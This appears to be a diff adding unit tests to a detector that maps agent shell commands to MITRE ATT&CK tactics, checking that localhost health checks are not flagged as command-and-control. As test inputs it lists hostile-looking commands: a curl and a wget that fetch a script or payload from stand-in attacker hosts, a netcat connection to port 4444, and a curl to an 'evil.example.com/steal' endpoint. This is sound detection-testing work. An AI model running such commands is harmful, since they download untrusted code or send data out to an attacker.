@@ -130,3 +130,41 @@ def test_mitre_run_shell_maps():
 def test_luhn_accepts_valid_card_rejects_random():
     assert _luhn_ok("4111111111111111") is True    # valid Visa test number
     assert _luhn_ok("1234567812345678") is False    # random 16 digits
+
+
+# --- network egress: loopback is not C2 ---------------------------------------
+
+def test_curling_your_own_localhost_is_not_command_and_control():
+    """Health-checking the daemon you just started is not egress. This fires on
+    every developer running the recorder, so tagging it TA0011 would bury the
+    real signal under their own dev loop."""
+    for cmd in (
+        "curl -s http://127.0.0.1:8000/api/v1/health",
+        "curl http://localhost:3000",
+        "wget -qO- http://0.0.0.0:8080/ready",
+    ):
+        m = get_mitre_mapping("Bash", {"command": cmd}) or {}
+        assert m.get("tactic_id") != "TA0011", f"loopback tagged as C2: {cmd}"
+
+
+def test_reaching_a_real_remote_host_is_still_c2():
+    for cmd in (
+        "curl https://evil-cdn.example.com/x.sh",
+        "nc 10.0.0.5 4444",
+        "wget http://203.0.113.7/payload",
+    ):
+        m = get_mitre_mapping("Bash", {"command": cmd}) or {}
+        assert m.get("technique_id") == "T1071.001", f"missed egress: {cmd}"
+
+
+def test_loopback_alongside_a_remote_host_still_counts():
+    """The exemption must not become a bypass: one localhost URL in the command
+    cannot launder a real exfil target sitting next to it."""
+    cmd = "curl -s http://127.0.0.1:8000/health && curl https://evil.example.com/steal"
+    m = get_mitre_mapping("Bash", {"command": cmd}) or {}
+    assert m.get("technique_id") == "T1071.001"
+
+
+def test_binding_a_dev_server_to_a_local_address_is_not_egress():
+    m = get_mitre_mapping("Bash", {"command": "python -m uvicorn api.main:app --host 127.0.0.1 --port 8000"}) or {}
+    assert m.get("tactic_id") != "TA0011"
